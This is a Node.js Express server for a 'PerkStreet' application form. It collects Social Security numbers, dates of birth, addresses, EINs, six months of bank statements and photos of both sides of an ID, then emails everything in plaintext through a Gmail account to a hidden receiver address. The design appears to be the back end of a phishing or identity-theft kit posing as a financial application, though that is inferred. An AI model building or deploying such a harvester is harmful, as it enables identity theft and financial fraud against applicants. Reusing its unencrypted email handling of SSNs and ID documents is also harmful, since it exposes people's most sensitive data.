require('dotenv').config();
const express = require('express');
const multer = require('multer');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.static('frontend'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Set up storage for multer
const storage = multer.memoryStorage();
const upload = multer({ storage: storage }).fields([
  { name: 'statement_jan' },
  { name: 'statement_feb' },
  { name: 'statement_mar' },
  { name: 'statement_apr' },
  { name: 'statement_may' },
  { name: 'statement_jun' },
  { name: 'front_id' },
  { name: 'back_id' }
]);

// Route to handle form submission
app.post('/submit', upload, async (req, res) => {
  try {
    const {
      ssn, dob, phone, email, businessName,
      businessAddress, homeAddress, ein, businessPhone,
      businessWebsite, businessEmail, annualRevenue, position
    } = req.body;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.SENDER_EMAIL,
        pass: process.env.SENDER_PASSWORD
      }
    });

    const attachments = [];
    const files = req.files || {};
    for (const key in files) {
      files[key].forEach(file => {
        attachments.push({
          filename: file.originalname,
          content: file.buffer
        });
      });
    }

    const mailOptions = {
      from: process.env.SENDER_EMAIL,
      to: process.env.RECEIVER_EMAIL,
      subject: 'New Application Submission - PerkStreet',
      text: `
New Application Received:

SSN: ${ssn}
DOB: ${dob}
Phone: ${phone}
Email: ${email}
Business Name: ${businessName}
Business Address: ${businessAddress}
Home Address: ${homeAddress}
EIN/Tax ID: ${ein}
Business Phone: ${businessPhone}
Business Website: ${businessWebsite}
Business Email: ${businessEmail}
Annual Revenue: ${annualRevenue}
Position: ${position}
      `,
      attachments: attachments
    };

    await transporter.sendMail(mailOptions);
    res.send('<h3 style="font-family:sans-serif;color:green;">â You're all set! We've received the application. Our team will review the information and get back to you within two business days. Keep an eye on your inbox.</h3>');
  } catch (error) {
    console.error('â Error submitting form:', error);
    res.status(500).send('<h3 style="font-family:sans-serif;color:red;">There was a problem processing your application. Please try again later or contact support.</h3>');
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
